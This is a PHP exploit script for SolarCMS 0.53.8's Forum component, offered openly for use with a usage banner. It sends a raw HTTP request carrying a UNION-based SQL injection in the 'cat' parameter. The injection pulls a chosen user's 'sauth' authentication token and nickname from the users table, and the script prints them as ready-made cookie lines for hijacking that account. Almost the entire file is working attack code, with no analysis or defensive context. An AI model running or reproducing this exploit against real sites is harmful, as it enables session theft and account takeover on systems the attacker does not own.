<?php

error_reporting(0);

/***************************************************************
 *  ---------------------------------------------------------  * 
 *  SolarCMS 0.53.8 (Forum) Remote Cookies Disclosure Exploit  *
 *  ---------------------------------------------------------  *
 *  by athos - staker[at]hotmail[dot]it                        *
 *  download on http://cms.maury91.org/                        *
 *  works regardless PHP.ini settings                          *                     
 *  ---------------------------------------------------------  *
 ***************************************************************/


list($file,$host,$path,$myid,$table) = $argv;

if($argc != 5) usage();

$cookie = (preg_match('/\^(.+?)\^/',get_cookies(),$out)) ? explode(':',$out[1]) : error();

if($path == '/')
{
      print "_nick={$cookie[1]}; path=/;\n";
      print "_sauth={$cookie[0]}; path=/;\n";
      exit;
}     
else
{
      print "/{$path}_nick={$cookie[1]}; path=/;\n";
      print "/{$path}_sauth={$cookie[0]}; path=/;\n";
      exit;
}      
 
 
 

function get_cookies()
{
      global $host,$path,$myid,$table;
       
      $data .= "GET {$path}/index.php?com=Forum&cat=-1+union+select+1,";
      $data .= "concat(0x5e,sauth,0x3a,nick,0x5e),3+from+{$table}+where+id={$myid}-- HTTP/1.1\r\n";
      $data .= "Host: {$host}\r\n";
      $data .= "User-Agent: Mozilla/4.5 [en] (Win95; U)\r\n";
      $data .= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
      $data .= "Connection: close\r\n\r\n";

      
      
      if(!$sock = fsockopen($host,80)) die("connection refused\n");
      
      fputs($sock,$data);
      
      while(!feof($sock))
      {
            $html .= fgets($sock);
      }    
      
      fclose($sock);
      return $html;
}     


       
function error()
{
      print "Exploit Failed!\n";
      print "Regards ;)\n";
      exit;
}

function usage()
{
      print "---------------------------------------------------------\n";    
      print "SolarCMS 0.53.8 (Forum) Remote Cookies Disclosure Exploit\n";
      print "---------------------------------------------------------\n";
      print "by athos - staker[at]hotmail[dot]it\n";
      print "Usage: php xpl.php [host] [path] [userid] [table]\n";
      print "php xpl.php example.com /  1 solarcms_users\n";
      exit;

}

